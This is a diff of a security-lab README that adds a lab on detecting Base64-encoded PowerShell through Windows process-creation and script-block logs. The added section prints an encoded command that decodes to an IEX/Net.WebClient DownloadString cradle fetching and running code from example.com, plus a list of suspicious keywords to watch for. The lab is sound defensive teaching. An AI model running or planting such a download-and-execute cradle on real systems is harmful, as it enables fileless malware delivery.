@@ -1,5 +1,7 @@
-🔐 Windows Authentication Monitoring & Brute Force Detection Lab    
-📌 Overview
+🔐 Windows Security Detection Labs
+This repository contains hands-on cybersecurity labs demonstrating how common attack techniques can be detected using Windows event logs.
+
+## Lab 1 – Windows Authentication Brute Force Detection
 
 This project simulates both local and remote brute-force authentication attempts against a Windows system and demonstrates how these attacks appear in Windows Security logs.
 
@@ -194,3 +196,144 @@ Windows eventually locked the account after repeated failures.
 Event ID 4740 – Account Locked Out
 
 This behavior demonstrates how repeated brute-force attempts can trigger defensive account lockout policies.
+
+
+## Lab 2 – Suspicious PowerShell Encoded Command Detection
+
+Overview
+
+PowerShell is a powerful administrative tool included with Windows, but it is frequently abused by attackers to execute malicious scripts directly in memory. One common technique is the use of encoded commands, where the PowerShell command is Base64-encoded to hide the true behavior from defenders.
+
+This lab simulates the execution of an encoded PowerShell command and demonstrates how security analysts can detect this activity using Windows logging.
+
+The investigation focuses on identifying suspicious PowerShell execution through:
+
+Event ID 4688 – Process Creation
+
+Event ID 4104 – PowerShell Script Block Logging
+
+Lab Environment
+
+Attacker System
+Kali Linux VM
+IP Address: 192.168.101.130
+
+Target System
+Windows Workstation
+IP Address: 192.168.101.134
+
+Network
+Local LAN (192.168.101.0/24)
+
+Attack Technique
+
+Attackers frequently use encoded PowerShell commands to hide malicious activity. Instead of executing a readable command, the script is encoded into Base64 and passed to PowerShell using the -EncodedCommand parameter.
+
+Example attacker command:
+
+powershell -EncodedCommand <Base64 encoded script>
+
+This technique helps attackers evade simple detection rules that search for suspicious keywords.
+
+Attack Simulation
+
+To simulate this technique, the following encoded PowerShell command was executed on the Windows system:
+
+powershell -EncodedCommand SQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AZQB4AGEAbQBwAGwAZQAuAGMAbwBtACIAKQA=
+
+When decoded, this command becomes:
+
+IEX (New-Object Net.WebClient).DownloadString("http://example.com
+")
+
+Explanation:
+
+IEX (Invoke-Expression)
+Executes a command directly in memory.
+
+New-Object Net.WebClient
+Creates a web client object.
+
+DownloadString()
+Downloads remote content from a web server.
+
+This behavior is commonly used by fileless malware to download and execute malicious payloads.
+
+In this lab, the command attempts to download content from example.com. Since the site returns HTML rather than PowerShell code, execution produces harmless parsing errors. However, the goal of the lab is not successful execution, but rather the detection of suspicious activity through Windows logs.
+
+Detection Investigation
+
+After executing the encoded command, Windows logs were analyzed to identify indicators of suspicious PowerShell activity.
+
+Event ID 4688 – Process Creation
+
+Location
+Windows Logs → Security
+
+This event records every new process created on the system.
+
+The following suspicious indicators were observed:
+
+New Process Name
+powershell.exe
+
+Command Line
+powershell.exe -EncodedCommand
+
+The presence of -EncodedCommand is a strong indicator of potentially malicious PowerShell usage and is frequently investigated by SOC analysts.
+
+Event ID 4104 – PowerShell Script Block Logging
+
+Location
+Applications and Services Logs → Microsoft → Windows → PowerShell → Operational
+
+Script Block Logging records the actual PowerShell code that was executed.
+
+The log revealed the decoded command:
+
+IEX (New-Object Net.WebClient).DownloadString("http://example.com
+")
+
+This demonstrates that even when commands are encoded, Windows can log the decoded script, allowing analysts to inspect potentially malicious behavior.
+
+Why This Matters
+
+Encoded PowerShell commands are commonly used by attackers because they:
+
+Hide malicious commands from simple detection rules
+Obfuscate scripts to evade security monitoring
+Execute code directly in memory without writing files to disk
+
+This technique is frequently observed in attacks involving:
+
+Cobalt Strike
+Emotet
+TrickBot
+PowerShell Empire
+
+For this reason, SOC analysts closely monitor PowerShell activity, especially commands that contain:
+
+-EncodedCommand
+Invoke-Expression (IEX)
+Net.WebClient
+DownloadString
+
+Key Takeaways
+
+This lab demonstrates how encoded PowerShell activity can be detected using built-in Windows logging.
+
+Security analysts can identify suspicious behavior by:
+
+Monitoring process creation events (Event ID 4688)
+Inspecting PowerShell Script Block logs (Event ID 4104)
+Investigating commands containing encoded payloads
+
+Proper logging configuration significantly improves visibility into PowerShell-based attacks.
+
+### Screenshots
+
+![PowerShell Process Creation](screenshots/4688-powershell-process.png)
+
+![Encoded Command](screenshots/4688-encoded-command.png)
+
+![Script Block Logging](screenshots/4104-scriptblock-decoded.png)
